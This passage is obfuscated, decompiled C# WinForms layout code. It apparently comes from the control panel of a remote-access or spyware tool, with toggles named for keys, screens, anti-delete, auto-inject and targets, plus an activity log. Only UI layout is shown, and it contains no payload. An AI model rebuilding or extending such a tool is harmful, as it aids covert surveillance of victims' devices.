		this.optn9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn9.Symbol = 61553;
		this.optn9.SymbolColor = System.Drawing.Color.White;
		this.optn9.SymbolSize = 23;
		this.optn9.TabIndex = 17;
		this.optn9.Text = EXGuarder._061D062F;
		this.optn9.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkantdelete.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkantdelete.ActiveText = EXGuarder._08631C18;
		this.checkantdelete.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkantdelete.Dock = System.Windows.Forms.DockStyle.Right;
		this.checkantdelete.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkantdelete.InActiveText = EXGuarder._08631C18;
		this.checkantdelete.Location = new System.Drawing.Point(814, 14);
		this.checkantdelete.Name = EXGuarder._1C403130;
		this.checkantdelete.Size = new System.Drawing.Size(33, 13);
		this.checkantdelete.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkantdelete.TabIndex = 16;
		this.checkantdelete.Text = EXGuarder._6D6C2019;
		this.Panel48.Controls.Add(this.optn8);
		this.Panel48.Controls.Add(this.Checkatoject);
		this.Panel48.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel48.Location = new System.Drawing.Point(0, 308);
		this.Panel48.Name = EXGuarder._20701B2B;
		this.Panel48.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel48.Size = new System.Drawing.Size(860, 41);
		this.Panel48.TabIndex = 12;
		this.optn8.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn8.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn8.ForeColor = System.Drawing.Color.White;
		this.optn8.Location = new System.Drawing.Point(13, 14);
		this.optn8.Name = EXGuarder._261E7829;
		this.optn8.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn8.Size = new System.Drawing.Size(801, 13);
		this.optn8.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn8.Symbol = 61671;
		this.optn8.SymbolColor = System.Drawing.Color.White;
		this.optn8.SymbolSize = 23;
		this.optn8.TabIndex = 17;
		this.optn8.Text = EXGuarder._1C423D0F;
		this.optn8.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Checkatoject.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.Checkatoject.ActiveText = EXGuarder._08631C18;
		this.Checkatoject.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Checkatoject.Dock = System.Windows.Forms.DockStyle.Right;
		this.Checkatoject.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.Checkatoject.InActiveText = EXGuarder._08631C18;
		this.Checkatoject.Location = new System.Drawing.Point(814, 14);
		this.Checkatoject.Name = EXGuarder._2E54364D;
		this.Checkatoject.Size = new System.Drawing.Size(33, 13);
		this.Checkatoject.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Checkatoject.TabIndex = 16;
		this.Checkatoject.Text = EXGuarder._6D6C2019;
		this.Panel24.Controls.Add(this.optn7);
		this.Panel24.Controls.Add(this.chkLivnotify);
		this.Panel24.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel24.Location = new System.Drawing.Point(0, 267);
		this.Panel24.Name = EXGuarder._1849204E;
		this.Panel24.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel24.Size = new System.Drawing.Size(860, 41);
		this.Panel24.TabIndex = 10;
		this.optn7.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn7.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn7.ForeColor = System.Drawing.Color.White;
		this.optn7.Location = new System.Drawing.Point(13, 14);
		this.optn7.Name = EXGuarder._58415061;
		this.optn7.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn7.Size = new System.Drawing.Size(801, 13);
		this.optn7.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn7.Symbol = 57446;
		this.optn7.SymbolColor = System.Drawing.Color.White;
		this.optn7.SymbolSize = 23;
		this.optn7.TabIndex = 17;
		this.optn7.Text = EXGuarder._20413320;
		this.optn7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.chkLivnotify.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.chkLivnotify.ActiveText = EXGuarder._08631C18;
		this.chkLivnotify.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.chkLivnotify.Dock = System.Windows.Forms.DockStyle.Right;
		this.chkLivnotify.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.chkLivnotify.InActiveText = EXGuarder._08631C18;
		this.chkLivnotify.Location = new System.Drawing.Point(814, 14);
		this.chkLivnotify.Name = EXGuarder._26524A4C;
		this.chkLivnotify.Size = new System.Drawing.Size(33, 13);
		this.chkLivnotify.Style = DrakeUI.Framework.UIStyle.Custom;
		this.chkLivnotify.TabIndex = 16;
		this.chkLivnotify.Text = EXGuarder._6D6C2019;
		this.Panel23.Controls.Add(this.optn6);
		this.Panel23.Controls.Add(this.checkRvlinks);
		this.Panel23.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel23.Location = new System.Drawing.Point(0, 226);
		this.Panel23.Name = EXGuarder._77293551;
		this.Panel23.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel23.Size = new System.Drawing.Size(860, 41);
		this.Panel23.TabIndex = 9;
		this.optn6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn6.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn6.ForeColor = System.Drawing.Color.White;
		this.optn6.Location = new System.Drawing.Point(13, 14);
		this.optn6.Name = EXGuarder._074F0263;
		this.optn6.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn6.Size = new System.Drawing.Size(801, 13);
		this.optn6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn6.Symbol = 62056;
		this.optn6.SymbolColor = System.Drawing.Color.White;
		this.optn6.SymbolSize = 23;
		this.optn6.TabIndex = 17;
		this.optn6.Text = EXGuarder._231A1B66;
		this.optn6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkRvlinks.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkRvlinks.ActiveText = EXGuarder._08631C18;
		this.checkRvlinks.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkRvlinks.Dock = System.Windows.Forms.DockStyle.Right;
		this.checkRvlinks.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkRvlinks.InActiveText = EXGuarder._08631C18;
		this.checkRvlinks.Location = new System.Drawing.Point(814, 14);
		this.checkRvlinks.Name = EXGuarder._3A294D2E;
		this.checkRvlinks.Size = new System.Drawing.Size(33, 13);
		this.checkRvlinks.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkRvlinks.TabIndex = 16;
		this.checkRvlinks.Text = EXGuarder._2A050D66;
		this.Panel22.Controls.Add(this.optn5);
		this.Panel22.Controls.Add(this.chkRvapps);
		this.Panel22.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel22.Location = new System.Drawing.Point(0, 185);
		this.Panel22.Name = EXGuarder._07402F12;
		this.Panel22.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel22.Size = new System.Drawing.Size(860, 41);
		this.Panel22.TabIndex = 8;
		this.optn5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn5.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn5.ForeColor = System.Drawing.Color.White;
		this.optn5.Location = new System.Drawing.Point(13, 14);
		this.optn5.Name = EXGuarder._20342635;
		this.optn5.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn5.Size = new System.Drawing.Size(801, 13);
		this.optn5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn5.Symbol = 57485;
		this.optn5.SymbolColor = System.Drawing.Color.White;
		this.optn5.SymbolSize = 23;
		this.optn5.TabIndex = 17;
		this.optn5.Text = EXGuarder._6240776F;
		this.optn5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.chkRvapps.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.chkRvapps.ActiveText = EXGuarder._08631C18;
		this.chkRvapps.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.chkRvapps.Dock = System.Windows.Forms.DockStyle.Right;
		this.chkRvapps.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.chkRvapps.InActiveText = EXGuarder._08631C18;
		this.chkRvapps.Location = new System.Drawing.Point(814, 14);
		this.chkRvapps.Name = EXGuarder._3D5A4715;
		this.chkRvapps.Size = new System.Drawing.Size(33, 13);
		this.chkRvapps.Style = DrakeUI.Framework.UIStyle.Custom;
		this.chkRvapps.TabIndex = 16;
		this.chkRvapps.Text = EXGuarder._16141715;
		this.Panel21.Controls.Add(this.optn4);
		this.Panel21.Controls.Add(this.checkRactv);
		this.Panel21.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel21.Location = new System.Drawing.Point(0, 144);
		this.Panel21.Name = EXGuarder._72506361;
		this.Panel21.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel21.Size = new System.Drawing.Size(860, 41);
		this.Panel21.TabIndex = 7;
		this.optn4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn4.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn4.ForeColor = System.Drawing.Color.White;
		this.optn4.Location = new System.Drawing.Point(13, 14);
		this.optn4.Name = EXGuarder._3C364663;
		this.optn4.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn4.Size = new System.Drawing.Size(801, 13);
		this.optn4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn4.Symbol = 61950;
		this.optn4.SymbolColor = System.Drawing.Color.White;
		this.optn4.SymbolSize = 23;
		this.optn4.TabIndex = 17;
		this.optn4.Text = EXGuarder._5860392A;
		this.optn4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkRactv.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkRactv.ActiveText = EXGuarder._08631C18;
		this.checkRactv.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkRactv.Dock = System.Windows.Forms.DockStyle.Right;
		this.checkRactv.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkRactv.InActiveText = EXGuarder._08631C18;
		this.checkRactv.Location = new System.Drawing.Point(814, 14);
		this.checkRactv.Name = EXGuarder._1948520A;
		this.checkRactv.Size = new System.Drawing.Size(33, 13);
		this.checkRactv.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkRactv.TabIndex = 16;
		this.checkRactv.Text = EXGuarder._514E492F;
		this.Panel20.Controls.Add(this.optn3);
		this.Panel20.Controls.Add(this.checkRnotfy);
		this.Panel20.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel20.Location = new System.Drawing.Point(0, 103);
		this.Panel20.Name = EXGuarder._4E52754F;
		this.Panel20.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel20.Size = new System.Drawing.Size(860, 41);
		this.Panel20.TabIndex = 6;
		this.optn3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn3.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn3.ForeColor = System.Drawing.Color.White;
		this.optn3.Location = new System.Drawing.Point(13, 14);
		this.optn3.Name = EXGuarder._5341210A;
		this.optn3.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn3.Size = new System.Drawing.Size(801, 13);
		this.optn3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn3.Symbol = 57445;
		this.optn3.SymbolColor = System.Drawing.Color.White;
		this.optn3.SymbolSize = 23;
		this.optn3.TabIndex = 17;
		this.optn3.Text = EXGuarder._4F0F7470;
		this.optn3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkRnotfy.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkRnotfy.ActiveText = EXGuarder._08631C18;
		this.checkRnotfy.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkRnotfy.Dock = System.Windows.Forms.DockStyle.Right;
		this.checkRnotfy.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkRnotfy.InActiveText = EXGuarder._08631C18;
		this.checkRnotfy.Location = new System.Drawing.Point(814, 14);
		this.checkRnotfy.Name = EXGuarder._66217846;
		this.checkRnotfy.Size = new System.Drawing.Size(33, 13);
		this.checkRnotfy.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkRnotfy.TabIndex = 16;
		this.checkRnotfy.Text = EXGuarder._1F452A2A;
		this.Panel18.Controls.Add(this.optn2);
		this.Panel18.Controls.Add(this.checkkeys);
		this.Panel18.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel18.Location = new System.Drawing.Point(0, 62);
		this.Panel18.Name = EXGuarder._2B38123A;
		this.Panel18.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel18.Size = new System.Drawing.Size(860, 41);
		this.Panel18.TabIndex = 4;
		this.optn2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn2.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn2.ForeColor = System.Drawing.Color.White;
		this.optn2.Location = new System.Drawing.Point(13, 14);
		this.optn2.Name = EXGuarder._5A732317;
		this.optn2.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn2.Size = new System.Drawing.Size(801, 13);
		this.optn2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn2.Symbol = 57454;
		this.optn2.SymbolColor = System.Drawing.Color.White;
		this.optn2.SymbolSize = 23;
		this.optn2.TabIndex = 17;
		this.optn2.Text = EXGuarder._1763562B;
		this.optn2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkkeys.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkkeys.ActiveText = EXGuarder._08631C18;
		this.checkkeys.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkkeys.Dock = System.Windows.Forms.DockStyle.Right;
		this.checkkeys.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkkeys.InActiveText = EXGuarder._08631C18;
		this.checkkeys.Location = new System.Drawing.Point(814, 14);
		this.checkkeys.Name = EXGuarder._01565866;
		this.checkkeys.Size = new System.Drawing.Size(33, 13);
		this.checkkeys.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkkeys.TabIndex = 16;
		this.checkkeys.Text = EXGuarder._2419454C;
		this.Panel46.Controls.Add(this.optn1);
		this.Panel46.Controls.Add(this.chkscrns);
		this.Panel46.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel46.Location = new System.Drawing.Point(0, 21);
		this.Panel46.Name = EXGuarder._08663D72;
		this.Panel46.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel46.Size = new System.Drawing.Size(860, 41);
		this.Panel46.TabIndex = 11;
		this.optn1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn1.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn1.ForeColor = System.Drawing.Color.White;
		this.optn1.Location = new System.Drawing.Point(13, 14);
		this.optn1.Name = EXGuarder._67030A67;
		this.optn1.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn1.Size = new System.Drawing.Size(801, 13);
		this.optn1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.optn1.Symbol = 57355;
		this.optn1.SymbolColor = System.Drawing.Color.White;
		this.optn1.SymbolSize = 23;
		this.optn1.TabIndex = 17;
		this.optn1.Text = EXGuarder._41272057;
		this.optn1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.chkscrns.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.chkscrns.ActiveText = EXGuarder._08631C18;
		this.chkscrns.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.chkscrns.Dock = System.Windows.Forms.DockStyle.Right;
		this.chkscrns.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.chkscrns.InActiveText = EXGuarder._08631C18;
		this.chkscrns.Location = new System.Drawing.Point(814, 14);
		this.chkscrns.Name = EXGuarder._2B682F51;
		this.chkscrns.Size = new System.Drawing.Size(33, 13);
		this.chkscrns.Style = DrakeUI.Framework.UIStyle.Custom;
		this.chkscrns.TabIndex = 16;
		this.chkscrns.Text = EXGuarder._6D6C2019;
		this.Panel19.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel19.Location = new System.Drawing.Point(0, 0);
		this.Panel19.Name = EXGuarder._6F221A09;
		this.Panel19.Size = new System.Drawing.Size(860, 21);
		this.Panel19.TabIndex = 5;
		this.TabPage4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage4.Controls.Add(this.logactivitystext);
		this.TabPage4.Controls.Add(this.clrbtn);
		this.TabPage4.Controls.Add(this.Panel25);
		this.TabPage4.Location = new System.Drawing.Point(0, 40);
		this.TabPage4.Name = EXGuarder._5B793258;
		this.TabPage4.Size = new System.Drawing.Size(860, 674);
		this.TabPage4.TabIndex = 3;
		this.TabPage4.Text = EXGuarder._483F0F01;
		this.logactivitystext.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.logactivitystext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logactivitystext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logactivitystext.Font = new System.Drawing.Font(EXGuarder._65142166, 10f);
		this.logactivitystext.ForeColor = System.Drawing.SystemColors.Control;
		this.logactivitystext.Location = new System.Drawing.Point(189, 0);
		this.logactivitystext.Name = EXGuarder._3D312231;
		this.logactivitystext.ReadOnly = true;
		this.logactivitystext.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.logactivitystext.Size = new System.Drawing.Size(671, 652);
		this.logactivitystext.TabIndex = 3;
		this.logactivitystext.Text = EXGuarder._2270690A;
		this.clrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clrbtn.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.clrbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.clrbtn.ForeHoverColor = System.Drawing.Color.Gray;
		this.clrbtn.Location = new System.Drawing.Point(189, 652);
		this.clrbtn.Name = EXGuarder._3E512863;
		this.clrbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.clrbtn.RectColor = System.Drawing.Color.Gray;
		this.clrbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.clrbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.clrbtn.Size = new System.Drawing.Size(671, 22);
		this.clrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clrbtn.Symbol = 61741;
		this.clrbtn.TabIndex = 43;
		this.clrbtn.Text = EXGuarder._5A3F0B79;
		this.Panel25.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel25.Controls.Add(this.DrakeWidth_W15);
		this.Panel25.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel25.Controls.Add(this.delbtn);
		this.Panel25.Controls.Add(this.DrakeWidth_W14);
		this.Panel25.Controls.Add(this.srchbtn);
		this.Panel25.Controls.Add(this.DrakeWidth_W12);
		this.Panel25.Controls.Add(this.Combodats);
		this.Panel25.Controls.Add(this.DrakeWidth_W13);
		this.Panel25.Controls.Add(this.comboTargts);
		this.Panel25.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel25.Location = new System.Drawing.Point(0, 0);
		this.Panel25.Name = EXGuarder._10140958;
		this.Panel25.Padding = new System.Windows.Forms.Padding(9);
		this.Panel25.Size = new System.Drawing.Size(189, 674);
		this.Panel25.TabIndex = 2;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillDisableColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(9, 599);
		this.DrakeUIButtonIcon2.Name = EXGuarder._4C23734A;
		this.DrakeUIButtonIcon2.Radius = 15;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(171, 22);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 57457;
		this.DrakeUIButtonIcon2.TabIndex = 49;
		this.DrakeUIButtonIcon2.Text = EXGuarder._19712B67;
		this.DrakeWidth_W15.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W15.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W15.Location = new System.Drawing.Point(9, 621);
		this.DrakeWidth_W15.Name = EXGuarder._6B082C4B;
		this.DrakeWidth_W15.Size = new System.Drawing.Size(171, 22);
		this.DrakeWidth_W15.TabIndex = 47;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(9, 643);
		this.DrakeUIButtonIcon1.Name = EXGuarder._53063161;
		this.DrakeUIButtonIcon1.Radius = 15;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(171, 22);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 57469;
		this.DrakeUIButtonIcon1.TabIndex = 48;
		this.DrakeUIButtonIcon1.Text = EXGuarder._0061094A;
		this.delbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.delbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.delbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillDisableColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.delbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delbtn.Location = new System.Drawing.Point(9, 147);
		this.delbtn.Name = EXGuarder._1B1E3705;
		this.delbtn.Radius = 15;
		this.delbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.delbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delbtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.delbtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.delbtn.Size = new System.Drawing.Size(171, 22);
		this.delbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.delbtn.Symbol = 57469;
		this.delbtn.TabIndex = 41;
		this.delbtn.Text = EXGuarder._00530034;
		this.DrakeWidth_W14.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W14.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W14.Location = new System.Drawing.Point(9, 125);
		this.DrakeWidth_W14.Name = EXGuarder._2737266C;
		this.DrakeWidth_W14.Size = new System.Drawing.Size(171, 22);
		this.DrakeWidth_W14.TabIndex = 46;
		this.srchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.srchbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.srchbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillDisableColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.srchbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.srchbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchbtn.Location = new System.Drawing.Point(9, 103);
		this.srchbtn.Name = EXGuarder._77001245;
		this.srchbtn.Radius = 15;
		this.srchbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.srchbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.srchbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchbtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.srchbtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.srchbtn.Size = new System.Drawing.Size(171, 22);
		this.srchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.srchbtn.Symbol = 61550;
		this.srchbtn.TabIndex = 39;
		this.srchbtn.Text = EXGuarder._453D436C;
		this.DrakeWidth_W12.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W12.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W12.Location = new System.Drawing.Point(9, 81);
		this.DrakeWidth_W12.Name = EXGuarder._31580411;
		this.DrakeWidth_W12.Size = new System.Drawing.Size(171, 22);
		this.DrakeWidth_W12.TabIndex = 44;
		this.Combodats.Dock = System.Windows.Forms.DockStyle.Top;
		this.Combodats.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.Combodats.Enabled = false;
		this.Combodats.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.Combodats.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.Combodats.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.Combodats.Items.AddRange(new object[4]
		{
			EXGuarder._2679564B,
			EXGuarder._271C5772,
			EXGuarder._4740612B,
			EXGuarder._4B606C75
		});
		this.Combodats.Location = new System.Drawing.Point(9, 56);
		this.Combodats.Margin = new System.Windows.Forms.Padding(4);
		this.Combodats.MinimumSize = new System.Drawing.Size(56, 0);
